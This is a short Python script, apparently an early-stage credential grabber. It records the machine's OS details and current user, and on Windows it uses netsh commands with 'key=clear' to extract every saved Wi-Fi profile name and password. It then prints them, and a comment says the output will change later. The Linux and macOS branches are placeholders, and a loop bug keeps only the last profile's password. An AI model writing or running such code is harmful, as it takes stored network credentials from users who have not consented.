#importing necessary library"s
import os
import platform
import subprocess

osName = os.name
operatingSystem = platform.system()
platformRelease = platform.release()
currentUser = os.getlogin()
#get wifi creds
if (operatingSystem == "Windows"):
	data = subprocess.check_output(["netsh", "wlan", "show", "profiles"]).decode("utf-8").split("\n")
	profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
	for i in profiles:
	    results = subprocess.check_output(["netsh", "wlan", "show", "profile", i, "key=clear"]).decode("utf-8").split("\n")
	    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
	    try:
	        wifiCreds = ("{:<30}|  {:<}".format(i, results[0]))
	    except IndexError:
	        wifiCreds = ("{:<30}|  {:<}".format(i, ""))
elif (operatingSystem == "Linux"):
	wifiCreds = "linux has to be fixed"
elif (operatingSystem == "Darwin"):
	wifiCreds = "MAC has to be fixed"

#printing out the crap for now, will be different later (as described in the readme)
print("computer info:" + "\n \t" + "OS name: " + osName + "\n \t" + "Platform: " + operatingSystem + "\n \t" + "Release: " + platformRelease + "\n \t" + "User: "+ currentUser + "\n")
print("wifi info:" + "\n \t" + wifiCreds)
